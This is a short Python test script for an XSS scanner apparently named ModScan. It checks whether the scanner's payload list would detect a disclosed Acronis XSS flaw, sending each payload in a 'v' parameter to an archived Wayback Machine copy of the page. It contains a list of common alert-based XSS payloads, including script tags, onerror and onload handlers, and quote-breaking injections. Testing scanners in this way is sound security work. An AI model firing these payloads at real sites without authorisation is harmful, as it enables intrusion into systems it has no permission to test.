#!/usr/bin/env python3
"""
Actually test if ModScan detects the disclosed XSS vulnerability
"""

import asyncio
import aiohttp
import sys
sys.path.append('.')

async def test_xss_detection_on_wayback():
    """Test if our enhanced XSS payloads detect the Acronis vulnerability"""
    
    wayback_url = "https://web.archive.org/web/20220410230648/https://www.acronis.com/products/cyber-protect/trial/"
    
    print(f"🎯 ACTUAL VULNERABILITY DETECTION TEST")
    print(f"Target: {wayback_url}")
    
    # HackerOne-enhanced payloads we added to the scanner
    xss_payloads = [
        # Standard payloads
        '<script>alert("MODSCAN_XSS")</script>',
        '<img src=x onerror=alert("MODSCAN_XSS")>',
        '<svg onload=alert("MODSCAN_XSS")>',
        
        # HackerOne redirect-based payloads (most common pattern)
        'javascript:alert("MODSCAN_XSS")',
        '"><script>alert("MODSCAN_XSS")</script>',
        '\'><script>alert("MODSCAN_XSS")</script>',
        
        # URL parameter injection (found 'v=' parameter)
        '<script>alert(document.domain)</script>',
        '"><svg/onload=alert("MODSCAN_XSS")>',
    ]
    
    vulnerabilities_found = []
    
    try:
        timeout = aiohttp.ClientTimeout(total=30)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            
            # Test each payload in the 'v=' parameter we found
            for i, payload in enumerate(xss_payloads):
                test_url = f"{wayback_url}?v={payload}"
                
                print(f"\n🔍 Testing payload {i+1}/{len(xss_payloads)}: {payload[:50]}...")
                
                try:
                    async with session.get(test_url) as response:
                        response_text = await response.text()
                        
                        # Check if payload is reflected in response (basic XSS detection)
                        if payload in response_text:
                            print(f"✅ VULNERABILITY FOUND!")
                            print(f"   Payload reflected in response")
                            vulnerabilities_found.append({
                                'payload': payload,
                                'url': test_url,
                                'evidence': f"Payload '{payload}' reflected in response"
                            })
                        else:
                            print(f"❌ Payload not reflected")
                            
                except Exception as e:
                    print(f"⚠️ Error testing payload: {e}")
                    
                # Small delay to be respectful
                await asyncio.sleep(0.5)
    
    except Exception as e:
        print(f"❌ Session error: {e}")
    
    # Results
    print(f"\n📊 DETECTION RESULTS:")
    print(f"Payloads tested: {len(xss_payloads)}")
    print(f"Vulnerabilities found: {len(vulnerabilities_found)}")
    
    if vulnerabilities_found:
        print(f"\n🏆 SUCCESS: ModScan WOULD detect this disclosed vulnerability!")
        for vuln in vulnerabilities_found:
            print(f"  ✅ {vuln['payload']}")
        return True
    else:
        print(f"\n❌ FAILED: Scanner needs further refinement")
        print(f"   The disclosed vulnerability was not detected by our payloads")
        return False

if __name__ == "__main__":
    result = asyncio.run(test_xss_detection_on_wayback())
    
    if result:
        print(f"\n🎉 VALIDATION SUCCESS: Historical vulnerability testing approach works!")
    else:
        print(f"\n🔧 REFINEMENT NEEDED: Scanner missed the disclosed vulnerability")